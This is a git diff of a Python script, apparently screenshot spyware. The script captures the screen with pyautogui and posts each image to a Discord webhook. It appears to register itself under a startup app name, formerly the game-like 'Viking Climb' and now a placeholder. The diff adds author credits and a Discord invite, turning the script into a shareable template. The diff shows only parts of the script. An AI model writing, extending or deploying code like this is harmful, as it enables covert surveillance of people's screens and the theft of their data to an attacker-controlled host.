@@ -1,3 +1,8 @@
+"""
+THIS WAS CODED BY CRYSTALPT. PLEASE DO NOT STEAL WITHOUT CREDITS.
+MAIN GITHUB LINK: https://github.com/CrystalPT
+"""
+
 import pyautogui
 import requests
 import io
@@ -20,7 +25,7 @@ DISCORD_WEBHOOK_URL = "YOUR_API_KEY_HERE"
 SCREENSHOT_MESSAGE = "Screen capture from your computer"
 
 # App name for startup entries
-APP_NAME = "Viking Climb"
+APP_NAME = "YOUR_APP_NAME"
 
 def take_screenshot():
     """Take a screenshot and return it as a bytes object."""
@@ -49,10 +54,10 @@ def send_to_discord(webhook_url, image_bytes, message="Screenshot"):
     # Create a nice embed with the image
     embed = {
         "title": "**📸 Screenshot Captured**",
-        "description": f"**{message}**\n\nTaken at: **{timestamp_str}**\nWith a delay of **{DELAY}** seconds",
+        "description": f"**{message}**\n\nTaken at: **{timestamp_str}**\nWith a delay of **{DELAY}** seconds\nJOIN MY DISCORD: https://discord.gg/6PEhT4u8WD",
         "color": 3447003,  # A nice blue color
         "footer": {
-            "text": "Automated Screenshot Service"
+            "text": "Automated Screenshot Service Made By CrystalPT"
         },
         "timestamp": timestamp.isoformat(),
         "image": {
